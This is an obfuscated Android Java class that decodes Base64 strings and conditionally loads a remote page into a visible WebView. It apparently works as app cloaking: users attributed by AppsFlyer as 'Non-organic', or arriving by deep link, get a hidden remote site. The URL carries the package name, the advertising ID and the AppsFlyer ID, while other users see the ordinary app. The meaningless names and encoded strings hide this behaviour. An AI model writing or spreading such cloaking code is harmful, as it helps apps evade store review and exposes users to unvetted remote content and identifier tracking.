package com.wfol.gdol.jjj;

import android.os.Build;
import android.view.View;
import android.webkit.WebView;

import androidx.annotation.RequiresApi;

import com.wfol.gdol.Apepepep;
import com.wfol.gdol.Slo;
import com.wfol.gdol.act.WG;

public class Djdjs {

    public static WG wg;

    @RequiresApi(api = Build.VERSION_CODES.O)
    public static void djsjs(WebView kfd){
        kfd.setVisibility(View.VISIBLE);
        String statusAppsFlyer = Apepepep.kidsha;
        String load = null;
        if (statusAppsFlyer.equals(Slo.dddee("Tm9uLW9yZ2FuaWM="))){
            load = Conon.url + Apepepep.iuey;
            kfd.loadUrl(load);
        }else if(FfF.dipLin != null) {
            load = Conon.url + FfF.dipLinLink;
            kfd.loadUrl(load);
        }else {
            if (Conon.keyDefault.equals(Slo.dddee("Tk8="))) {
                WG.ste(wg);
            }else {
                String strAppsFlyer = Conon.keyDefault + Slo.dddee("P2J1bmRsZT0=") + wg.getPackageName() + Slo.dddee("JmFkX2lkPQ==") + Apepepep.uyret + Slo.dddee("JmFwcHNfaWQ9") + Apepepep.kfidf;
                load = Conon.url + strAppsFlyer;
                kfd.loadUrl(load);
            }
        }


    }
}
